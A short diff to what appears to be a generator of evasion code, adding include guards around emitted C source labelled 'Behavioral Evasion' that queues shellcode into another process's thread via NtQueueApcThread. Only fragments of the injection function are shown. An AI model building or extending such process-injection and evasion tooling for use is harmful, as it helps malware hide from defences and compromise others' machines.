@@ -28,6 +28,9 @@ def generate_apc_injection() -> Dict[str, Any]:
 // Layer 4 – Behavioral Evasion
 // Queues shellcode execution via NtQueueApcThread into an alertable thread.
 
+#ifndef PHANTOM_APC_INJECTION_INCLUDED
+#define PHANTOM_APC_INJECTION_INCLUDED
+
 #include <windows.h>
 #include <tlhelp32.h>
 
@@ -89,6 +92,8 @@ static BOOL apc_inject(DWORD pid,
     CloseHandle(hProcess);
     return TRUE;
 }
+
+#endif /* PHANTOM_APC_INJECTION_INCLUDED */
 """
 
     return {
